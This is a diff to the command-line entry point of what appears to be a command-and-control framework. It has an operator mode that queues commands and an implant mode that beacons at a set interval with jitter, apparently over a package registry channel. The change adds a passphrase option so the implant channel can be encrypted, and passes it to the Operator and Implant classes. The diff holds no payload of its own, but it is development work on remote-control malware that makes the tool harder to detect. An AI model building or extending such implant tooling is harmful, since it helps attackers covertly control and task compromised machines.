@@ -76,6 +76,8 @@ def main():
     op = sub.add_parser("operator")
     op.add_argument("--package", "-p", required=True)
     op.add_argument("--token", "-t", required=True)
+    op.add_argument("--passphrase", default=None,
+                    help="channel passphrase; required if the implant encrypts")
     act = op.add_subparsers(dest="action", required=True)
 
     t = act.add_parser("task", help="queue a command and return at once")
@@ -109,6 +111,7 @@ def main():
     imp = sub.add_parser("implant")
     imp.add_argument("--package", "-p", required=True)
     imp.add_argument("--token", "-t", default=None)
+    imp.add_argument("--passphrase", default=None)
     imp.add_argument("--interval", type=int, default=60)
     imp.add_argument("--jitter", type=int, default=20)
     imp.add_argument("--verbose", "-v", action="store_true")
@@ -146,7 +149,8 @@ def main():
 
     if args.mode == "operator":
         from .operator import Operator, RegistryError
-        o = Operator(args.package, args.token)
+        o = Operator(args.package, args.token,
+                     passphrase=getattr(args, "passphrase", None))
         try:
             if args.action == "task":
                 if args.cmd:
@@ -192,7 +196,8 @@ def main():
     elif args.mode == "implant":
         from .implant import Implant
         imp = Implant(args.package, args.token,
-                      args.interval, args.jitter, args.verbose)
+                      args.interval, args.jitter, args.verbose,
+                      passphrase=getattr(args, "passphrase", None))
         imp.run()
 
     else:
